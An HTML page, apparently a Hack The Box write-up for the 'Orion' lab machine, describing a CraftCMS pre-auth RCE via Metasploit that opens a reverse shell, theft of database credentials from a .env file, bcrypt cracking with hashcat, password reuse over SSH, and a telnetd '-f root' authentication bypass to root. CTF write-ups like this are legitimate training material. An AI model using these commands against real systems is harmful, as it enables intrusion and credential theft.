@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Meow — HTB Reports</title>
+  <link rel="stylesheet" href="../style.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Inter:wght@400;500&display=swap" rel="stylesheet" />
+</head>
+<body class="report-body">
+
+  <header>
+    <div class="container">
+      <h1 class="site-title">HTB Reports</h1>
+      <p class="site-subtitle">Hack The Box challenge writeups and notes</p>
+    </div>
+  </header>
+
+  <main>
+    <div class="container">
+
+      <div class="report-header">
+        <a href="../index.html" class="report-back"><- Back to index</a>
+        <h1 class="report-title">Orion</h1>
+        <div class="report-meta-row">
+          <span class="badge badge-machine">Machine</span>
+          <span class="difficulty easy">Easy</span>
+          <span class="tag">Linux</span>
+          <span class="tag">Web</span>
+          <span class="tag">Telnet</span>
+          <span class="tag">CVE-2025-32432</span>
+          <span class="card-date">2025-06-28</span>
+        </div>
+      </div>
+
+      <div class="report-content">
+
+        <h2>Summary</h2>
+        <p>
+          Orion is a very easy Linux machine that features CSRF Validation Bypass and exploration of CraftCMS and Telnetd. The foothold includes achieving remote code execution by exploiting CVE-2025-32432 in a vulnerable version of CraftCMS. Then the default Craft environment variable file exposes the credentials for its MySQL database, which contains a crackable password. The password has been reused and leads to SSH access to the user on the machine. Finally, privilege escalation is achieved by finding and exploiting a vulnerable version of telnetd (CVE-2026-24061), allowing authentication bypass to root.
+
+        <h2>Reconnaissance</h2>
+        <h3>Nmap</h3>
+        <pre><code>nmap -sV 10.129.244.146 </code></pre>
+        <p>Key ports discovered:</p>
+        <ul>
+          <li><code>22/tcp</code> - ssh - openSSH </li>
+          <li><code>80/tcp</code> - http - nginx</li>
+        </ul>
+        <h3>Web Server</h3>
+        <p>Adding orion.htp to <code>etc/hosts</code> we are able to connect to the web server. This displays a site for the "Orion" company and scrolling to the bottom we can find they are using the content managemnet service CraftCMS. Visiting <code>orion.htb/admin</code> we can see that it is running version 5.6.16. Researching this version we can find CVE-2025-32432 which is a remote code execution vulnerability. Using the resources below I was able to learn more about the vulnerability and begin my exploitation.</p>
+        <ul>
+          <li><a href="https://censys.com/advisory/cve-2025-32432/">Censys.com</a></li>
+          <li><a href="https://github.com/Sachinart/CVE-2025-32432">Github POC</a></li>
+        </ul>
+
+        <h2>Exploitation</h2>
+        <h3>Initial Access - Exploiting CVE-2025-32432</h3>
+        <p>Researching online we are able to find that there is a prebuilt exploit throguh Metasploit which we can use to gain initial access.</p>
+        <pre><code>
+msf > use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set rhosts orion.htb
+rhosts => orion.htb
+msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set rport 80
+rport => 80
+msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set lhost 10.1
+msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > exploit
+[*] Started reverse TCP handler on 10.10.16.71:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] Leaked session.save_path: /var/lib/php/sessions
+[+] The target is vulnerable. Session path leaked
+[*] Injecting stub & triggering payload...
+[*] Sending stage (45739 bytes) to 10.129.244.146
+[*] Meterpreter session 1 opened (10.10.16.71:4444 -> 10.129.244.146:38806) at 2026-06-28 20:23:59 -0400
+meterpreter > getuid
+Server username: www-data
+meterpreter > shell
+Process 2016 created.
+Channel 0 created.
+script /dev/null -c /bin/bash
+Script started, output log file is '/dev/null'.
+www-data@orion:~/html/craft/web$
+        </code></pre>
+        <h3>Finding a User</h3>
+        <p>Now that we have a shell on the web server we are able to look around. Moving back one directory into the <code>~/html/craft</code> directoy and using <code>ls -la</code> we are able to see a file <code>.env</code>. By running <code>cat .env</code> we are able to see</p>
+        <pre><code>
+# Read about configuration, here:
+# https://craftcms.com/docs/5.x/configure.html
+
+# The application ID used to to uniquely store session and cache data, mutex locks, and more
+CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff
+
+# The environment Craft is currently running in (dev, staging, production, etc.)
+CRAFT_ENVIRONMENT=dev
+
+# General settings
+CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
+CRAFT_DEV_MODE=true
+CRAFT_ALLOW_ADMIN_CHANGES=true
+CRAFT_DISALLOW_ROBOTS=true
+CRAFT_DB_DRIVER=mysql
+CRAFT_DB_SERVER=127.0.0.1
+CRAFT_DB_PORT=3306
+CRAFT_DB_DATABASE=orion
+CRAFT_DB_USER=root
+CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
+CRAFT_DB_SCHEMA=
+CRAFT_DB_TABLE_PREFIX=
+
+PRIMARY_SITE_URL=http://orion.htb/ 
+        </code></pre>
+        <p>Importnantly from this file we can see there is a database with the user <code>root</code> and password <code>SuperSecureCraft123Pass!</code>. Connecting to the database using <code>mysql -u root -p orion</code> and entering in the password we are able to access the database. Running <code>select * from users;</code> we are able to find.</p>
+        <pre><code>
+1 | admin | NULL | NULL | NULL | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS | 2026-03-12 11:25:04
+        </code></pre>
+        <p>This is the database admin and user for CraftCMS but maybe they have reused it for the parent system. However this password is hashed, so we must use hashcat to decrypt it. Since this hash begins with <code>$2y$</code> it is a bycrpt hash and we can use <code>-m 3200</code> as the mode.</p>
+        <p>Running that command <code>hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt</code> we can see that the users password is <code>darkangel</code>.</p>
+        <p>Now we are able to attempt to login using <code>ssh adam@orion.htb</code>, which successfully connects. In adams home directory we are able to find <code>user.txt</code> which gives us the user flag and the first solve of the box</p>
+        <h3>Privilege Escalation</h3>
+        <p>Now as Adam we are able to see if there are any ports that werent exposed externally.</p>
+        <pre><code>
+adam@orion:~$ netstat -tulnp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:23            0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                 
+        </code></pre>
+        <p>Here we can see port 23 is open for telnet and using <code>telnet --version</code>, we can see it is using <code>telnet (GNU inetutils) 2.7</code>. With a quick search of the version we can find a very simple privilege escalation vulnerability by using <code>USER="-f root"</code>.</p>
+        <pre><code>
+adam@orion:~$ USER="-f root" telnet -a 127.0.0.1
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+...
+root@orion:~# cat root.txt
+-flag-
+        </code></pre>
+        <p>This completes the Orion machine</p>
+
+      </div>
+    </div>
+  </main>
+
+  <footer>
+    <div class="container">
+      <p>All content is for educational purposes.</p>
+    </div>
+  </footer>
+
+</body>
+</html>
